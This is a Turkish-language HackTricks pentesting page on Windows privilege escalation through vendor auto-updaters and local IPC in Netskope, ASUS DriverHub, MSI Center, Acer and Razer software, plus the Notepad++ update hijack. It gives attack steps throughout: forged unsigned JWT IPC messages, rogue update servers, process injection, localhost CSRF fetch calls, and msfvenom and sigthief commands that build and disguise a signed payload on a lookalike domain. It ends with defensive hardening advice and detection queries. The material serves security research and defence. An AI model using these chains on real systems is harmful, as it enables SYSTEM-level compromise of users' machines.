# Enterprise Auto-Updaters ve Privileged IPC’yi Suistimal Etme (ör., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, enterprise endpoint agents ve updaters içinde bulunan; düşük sürtünmeli bir IPC surface ve privileged update flow açığa çıkaran Windows local privilege escalation zincirlerinden oluşan bir sınıfı geneller. Temsilî bir örnek, Windows < R129 için Netskope Client’tır (CVE-2025-0309); burada low-privileged bir user, enrollment’ı attacker-controlled bir server’a zorlayabilir ve ardından SYSTEM service’in kuracağı malicious bir MSI teslim edebilir.

Yeniden kullanabileceğin temel fikirler:
- Bir privileged service’in localhost IPC’sini suistimal ederek attacker server’a yeniden enrollment veya reconfiguration zorla.
- Vendor’un update endpoints’lerini implement et, rogue Trusted Root CA teslim et ve updater’ı malicious, “signed” bir package’a yönlendir.
- Zayıf signer kontrollerinden (CN allow-lists), optional digest flags’ten ve gevşek MSI properties’den kaçın.
- IPC “encrypted” ise, registry’de saklanan world-readable machine identifiers’dan key/IV’yi türet.
- Service, callers’ı image path/process name ile kısıtlıyorsa, allow-listed bir process’e inject et veya suspended olarak birini spawn edip minimal thread-context patch ile DLL’ini bootstrap et.

---
## 1) localhost IPC üzerinden enrollment’ı bir attacker server’a zorlamak

Birçok agent, SYSTEM service ile localhost TCP üzerinden JSON kullanarak konuşan user-mode bir UI process’i ile gelir.

Netskope’da gözlemlendi:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend host’u kontrol eden claim’lere sahip bir JWT enrollment token’ı oluştur (ör. AddonUrl). İmza gerekmemesi için alg=None kullan.
2) Provisioning komutunu çağıran IPC mesajını JWT’in ve tenant adıyla birlikte gönder:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için rogue sunucunuza istek göndermeye başlar, ör.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Eğer caller verification path/name tabanlıysa, isteği allow-listed bir vendor binary’den başlatın (bkz. §4).

---
## 2) Update channel’ı hijack ederek code’u SYSTEM olarak çalıştırmak

Client sunucunuzla konuşmaya başladıktan sonra, beklenen endpoints’i implement edin ve onu attacker MSI’a yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir updater interval içeren JSON config döndürün, ör.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA certificate döndürür. Service bunu Local Machine Trusted Root store içine kurar.
3) /v2/checkupdate → Kötü amaçlı bir MSI ve sahte bir sürüme işaret eden metadata sağlayın.

Sahada görülen yaygın kontrolleri aşmak:
- Signer CN allow-list: service yalnızca Subject CN değerinin “netSkope Inc” veya “Netskope, Inc.” ile eşleşip eşleşmediğini kontrol edebilir. Sizin rogue CA’nız bu CN ile bir leaf üretebilir ve MSI’ı imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adında zararsız bir MSI property ekleyin. Install sırasında enforcement yok.
- Optional digest enforcement: config flag (ör. check_msi_digest=false) ekstra kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM service, MSI’ınızı
C:\ProgramData\Netskope\stAgent\data\*.msi
içinden kurar ve NT AUTHORITY\SYSTEM olarak arbitrary code çalıştırır.

---
## 3) Şifrelenmiş IPC requests forge etmek (varsa)

R127’den itibaren Netskope, IPC JSON’u Base64 gibi görünen bir encryptData field’ı içine sardı. Reverse engineering, anahtar/IV’nin herhangi bir user tarafından okunabilen registry değerlerinden türetilen AES kullandığını gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attacker’lar bu encryption’ı yeniden üretebilir ve standart bir user’dan geçerli şifreli komutlar gönderebilir. Genel ipucu: bir agent IPC’sini aniden “encrypt” ediyorsa, HKLM altında device ID’ler, product GUID’ler, install ID’ler gibi materyalleri arayın.

---
## 4) IPC caller allow-list’lerini aşmak (path/name checks)

Bazı service’ler, TCP connection’ın PID’sini çözüp image path/name’i Program Files altında bulunan allow-listed vendor binary’lerle (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak peer’ı authenticate etmeye çalışır.

İki pratik bypass:
- Allow-listed bir process içine DLL injection yapıp (ör. nsdiag.exe) IPC’yi içeriden proxy etmek.
- CreateRemoteThread olmadan, suspended durumda bir allow-listed binary başlatıp proxy DLL’inizi bootstrap etmek (bkz. §5) ve driver-enforced tamper kurallarını karşılamak.

---
## 5) Tamper-protection dostu injection: suspended process + NtContinue patch

Products genellikle protected process’lere ait handle’lardan tehlikeli rights’ları silmek için bir minifilter/OB callbacks driver (ör. Stadrv) ile gelir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME kaldırılır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlandırılır

Bu kısıtları dikkate alan güvenilir bir user-mode loader:
1) CREATE_SUSPENDED ile bir vendor binary için CreateProcess çalıştırın.
2) Hâlâ almanıza izin verilen handle’ları elde edin: process için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve thread için THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya bilinen bir RIP üzerinde code patch yapıyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue (veya erken yüklenen, kesin olarak mapped başka bir thunk) üzerine, DLL path’inizde LoadLibraryW çağıran küçük bir stub yazın, ardından geri zıplatın.
4) Stub’ı process içinde tetiklemek için ResumeThread kullanın ve DLL’inizi yükleyin.

Zaten protected olan bir process üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (process’i siz oluşturduğunuzdan), driver’ın policy’si sağlanmış olur.

---
## 6) Pratik tooling
- NachoVPN (Netskope plugin) rogue CA, kötü amaçlı MSI signing ve gerekli endpoint’leri otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope, keyfi (isteğe bağlı AES-encrypted) IPC messages oluşturan ve allow-listed bir binary’den kaynaklanması için suspended-process injection içeren özel bir IPC client’tır.

## 7) Bilinmeyen updater/IPC surface’leri için hızlı triage workflow’u

Yeni bir endpoint agent veya motherboard “helper” suite ile karşılaştığınızda, hızlı bir workflow genellikle bunun umut vadeden bir privesc target olup olmadığını anlamaya yeter:

1) Loopback listener’ları enumerate edin ve bunları vendor process’lerine eşleyin:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Aday named pipe'ları numaralandırın:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Plugin-based IPC servers tarafından kullanılan registry-backed routing verilerini mine edin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Önce user-mode client’dan endpoint adlarını, JSON key’lerini ve command ID’lerini çıkar. Packed Electron/.NET frontend’ler sıklıkla tüm schema’yı leak eder:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Süreci sonunda başlatan code path’i değil, asıl trust predicate’i avlayın:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Dikkate alınması gereken öncelikli patterns:
- WinVerifyTrust olmadan `CryptQueryObject`/certificate parsing kullanımı genelde “certificate exists” durumunun “certificate is trusted” olarak ele alındığı anlamına gelir; bu da certificate cloning veya diğer fake-signer tricks’e yol açar.
- `Origin`, `Referer`, download URL’leri, process names veya signer CN’ler üzerinde yapılan substring/suffix kontrolleri authentication değildir. `contains(".vendor.com")` genellikle attacker-controlled lookalike domain’lerle exploitable olur.
- Eğer low-privileged GUI “the file is trusted” kararını veriyor ve SYSTEM broker sadece bu sonucu tüketiyorsa, client-side DLL/JS’yi patch etmek veya yeniden implement etmek çoğu zaman boundary’yi tamamen bypass eder (Razer-style split validation).
- Eğer broker bir payload’u `%TEMP%`/`C:\Windows\Temp` içine kopyalıyor ve ardından onu bu path üzerinden validate ediyor veya schedule ediyorsa, hemen TOCTOU replacement windows ve daha zayıf checks’e sahip alternate `ExecuteTask()` wrappers sunan sibling plugin modules için test edin.

Named-pipe ağırlıklı targets için PipeViewer, protocol’ü derinlemesine reverse etmeye başlamadan önce weak DACL’leri ve remotely reachable pipes’ı hızlıca tespit etmenin bir yoludur.

Eğer target callers’ı yalnızca PID, image path veya process name ile authenticate ediyorsa, bunu bir boundary’den ziyade bir speed bump olarak değerlendirin: legitimate client içine inject etmek veya connection’ı allow-listed bir process üzerinden yapmak çoğu zaman server’ın checks’ini karşılamak için yeterlidir. Named pipes özelinde, [client impersonation and pipe abuse hakkındaki bu sayfa](named-pipe-client-impersonation.md) primitive’i daha derinlemesine ele alır.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde browser calls’ını https://driverhub.asus.com adresinden gelmiş varsayan user-mode bir HTTP service (ADU.exe) ile birlikte gelir. Origin filter sadece Origin header’ı ve `/asus/v1.0/*` üzerinden sunulan download URL’leri üzerinde `string_contains(".asus.com")` kontrolü yapar. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi attacker-controlled herhangi bir host kontrolü geçer ve JavaScript üzerinden state-changing requests gönderebilir. Ek bypass patterns için [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) bölümüne bakın.

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve orada malicious bir webpage barındırın.
2) `fetch` veya XHR kullanarak `http://127.0.0.1:53000` üzerinde privileged bir endpoint’i (ör. `Reboot`, `UpdateApp`) çağırın.
3) Handler’ın beklediği JSON body’yi gönderin – packed frontend JS aşağıdaki schema’yı gösterir.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI bile Origin header güvenilen değere spoof edildiğinde başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body içinde tanımlanan rastgele executables dosyalarını indirir ve bunları `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` içinde cache’ler. Download URL doğrulaması aynı substring logic’i yeniden kullanır, bu yüzden `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. Download’dan sonra ADU.exe yalnızca PE içinde bir signature olup olmadığını ve Subject string’inin ASUS ile eşleşip eşleşmediğini kontrol eder, ardından çalıştırır – `WinVerifyTrust` yok, chain validation yok.

Akışı weaponize etmek için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS’un signer’ını içine clone edin (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir domain üzerinde host edin ve yukarıdaki browser CSRF ile UpdateApp’i tetikleyin.

Hem Origin hem de URL filters substring-based olduğu ve signer check yalnızca string’leri karşılaştırdığı için, DriverHub attacker binary’sini yükseltilmiş context altında çeker ve çalıştırır.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’ın SYSTEM service’i, her frame’in `4-byte ComponentID || 8-byte CommandID || ASCII arguments` olduğu bir TCP protocol expose eder. Core component (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` ile gelir. Handler’ı:
1) Verilen executable’ı `C:\Windows\Temp\MSI Center SDK.exe` içine kopyalar.
2) Signature’ı `CS_CommonAPI.EX_CA::Verify` üzerinden doğrular (certificate subject “MICRO-STAR INTERNATIONAL, CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalı).
3) Temp file’ı attacker-controlled arguments ile SYSTEM olarak çalıştıran bir scheduled task oluşturur.

Kopyalanan file, verification ile `ExecuteTask()` arasında lock edilmez. Saldırgan şunları yapabilir:
- Geçerli bir MSI-signed binary’ye işaret eden Frame A gönderir (signature check’in geçmesini ve task’ın queue’ya alınmasını garanti eder).
- Bunu, malicious payload’a işaret eden tekrarlayan Frame B mesajlarıyla race eder; böylece `MSI Center SDK.exe` verification tamamlandıktan hemen sonra overwrite edilir.

Scheduler tetiklendiğinde, orijinal file doğrulanmış olsa bile overwritten payload’u SYSTEM altında çalıştırır. Güvenilir exploitation için, CMD_AutoUpdateSDK’yi TOCTOU window kazanılana kadar spamleyen iki goroutine/thread kullanılır.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Frame’in ilk 4 byte’ı bu component’i seçer; bu da saldırganların komutları keyfi module’lere yönlendirmesine izin verir.
- Plugin’ler kendi task runner’larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` ifadesini expose eder ve doğrudan **signature validation olmadan** `API_Support.EX_Task::ExecuteTask()` çağırır – herhangi bir local user bunu `C:\Users\<user>\Desktop\payload.exe` dosyasına yöneltebilir ve deterministik olarak SYSTEM execution elde edebilir.
- Wireshark ile loopback sniff etmek veya dnSpy içinde .NET binary’lerini instrument etmek Component ↔ command mapping’ini hızlıca ortaya çıkarır; custom Go/ Python clients sonra frame’leri replay edebilir.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM), `\\.\pipe\treadstone_service_LightMode` pipe’ını expose eder ve discretionary ACL remote clients’a izin verir (ör. `\\TARGET\pipe\treadstone_service_LightMode`). Command ID `7` ile bir file path göndermek, service’in process-spawning routine’ini çağırır.
- Client library, args ile birlikte magic terminator byte (113) serialize eder. Frida/`TsDotNetLib` ile yapılan dynamic instrumentation (instrumentation ipuçları için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümüne bakın) native handler’ın `CreateProcessAsUser` çağırmadan önce bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID’e map ettiğini gösterir.
- 113 (`0x71`) değerini 114 (`0x72`) ile değiştirmek, generic branch’e düşer; bu branch full SYSTEM token’ı korur ve high-integrity SID (`S-1-16-12288`) ayarlar. Bu nedenle spawned binary hem local hem cross-machine olarak unrestricted SYSTEM altında çalışır.
- Bunu exposed installer flag’i (`Setup.exe -nocheck`) ile birleştirerek, vendor hardware olmadan bile lab VM’lerde ACC kurup pipe’ı test edebilirsiniz.

Bu IPC bug’ları, localhost services’in neden mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) uygulaması gerektiğini ve her module’ün “run arbitrary binary” helper’ının neden aynı signer verification’ları paylaşması gerektiğini gösterir.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4, bu aileye başka yararlı bir pattern ekledi: düşük yetkili bir user, `RzUtility.Elevator` üzerinden bir COM helper’a process başlatmasını isteyebilir; ancak trust decision, privileged boundary içinde sağlam biçimde enforce edilmek yerine user-mode bir DLL’e (`simple_service.dll`) devredilir.

Gözlemlenen exploitation path:
- COM object `RzUtility.Elevator` instantiate edilir.
- Elevated launch talep etmek için `LaunchProcessNoWait(<path>, "", 1)` çağrılır.
- Public PoC’de, request gönderilmeden önce `simple_service.dll` içindeki PE-signature gate patch edilir; böylece attacker’ın seçtiği rastgele bir executable başlatılabilir.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Genel çıkarım: “helper” paketlerini tersine mühendislik yaparken localhost TCP veya named pipes ile yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM classes arayın, ardından ayrıcalıklı service’in gerçekten hedef binary’yi doğrulayıp doğrulamadığını, yoksa yalnızca patch edilebilir user-mode client DLL tarafından hesaplanan bir sonuca mı güvendiğini kontrol edin. Bu desen Razer’ın ötesine genellenir: yüksek ayrıcalıklı broker’ın düşük ayrıcalıklı taraftan gelen allow/deny kararını tükettiği her split design, bir privesc surface adayıdır.

---
## Zayıf updater validation üzerinden remote supply-chain hijack (WinGUp / Notepad++)

June 2025 ile December 2025 arasında, Notepad++ update flow’unun arkasındaki hosting infrastructure’ı ele geçiren saldırganlar, seçilmiş kurbanlara seçici olarak malicious manifest’ler sundu. Eski WinGUp tabanlı updaters update authenticity’yi tam olarak doğrulamıyordu; bu yüzden hostile bir XML response istemcileri attacker-controlled URL’lere yönlendirebiliyordu. Client, indirilen installer üzerinde hem trusted certificate chain hem de valid PE signature zorlamadan HTTPS content kabul ettiği için, kurbanlar trojanized bir NSIS `update.exe` dosyasını indirip çalıştırdı.

Operational flow (local exploit gerekmez):
1. **Infrastructure interception**: CDN/hosting’i compromise edin ve update kontrollerine attacker metadata ile cevap vererek malicious download URL’sini işaret edin.
2. **Trojanized NSIS**: installer bir payload indirir/çalıştırır ve iki execution chain’ini kötüye kullanır:
- **Bring-your-own signed binary + sideload**: imzalı Bitdefender `BluetoothService.exe`’yi paketleyin ve arama yoluna malicious `log.dll` bırakın. İmzalı binary çalıştığında Windows `log.dll`’yi sideload eder; bu DLL Chrysalis backdoor’unu decrypt eder ve reflectively load eder (static detection’ı zorlaştırmak için Warbird-protected + API hashing).
- **Scripted shellcode injection**: NSIS, shellcode inject etmek ve Cobalt Strike Beacon stage etmek için Win32 APIs (örn. `EnumWindowStationsW`) kullanan compiled bir Lua script çalıştırır.

Herhangi bir auto-updater için hardening/detection çıkarımları:
- İndirilen installer’ın **certificate + signature verification**’ını zorlayın (vendor signer pinleyin, eşleşmeyen CN/chain’i reddedin) ve update manifest’inin kendisini de imzalayın (örn. XMLDSig). Doğrulanmadıkça manifest-controlled redirect’leri engelleyin.
- **BYO signed binary sideloading**’i bir post-download detection pivot’u olarak ele alın: imzalı bir vendor EXE’nin canonical install path’i dışından bir DLL adı yüklediğinde (örn. Bitdefender’ın Temp/Downloads içinden `log.dll` yüklemesi) ve updater Temp’ten vendor dışı imzalarla installer bırakıp çalıştırdığında alarm üretin.
- Bu zincirde gözlenen **malware-specific artifact**’leri izleyin (genel pivot olarak faydalıdır): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` içine yapılan anormal `gup.exe` yazımları ve Lua-driven shellcode injection aşamaları.
- Notepad++ buna v8.8.9 ve sonrasında WinGUp’i güçlendirerek karşılık verdi: dönen XML artık imzalı (XMLDSig) ve yeni build’ler yalnızca transport’a güvenmek yerine indirilen installer’ın certificate + signature verification’ını zorunlu kılıyor.

<details>
<summary>Cortex XDR XQL – Bitdefender-imzalı EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Bu kalıplar, imzasız manifest kabul eden veya installer signer'larını sabitlemeyi başaramayan herhangi bir updater için genellenebilir—network hijack + malicious installer + BYO-signed sideloading, “trusted” updates kisvesi altında remote code execution sağlar.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
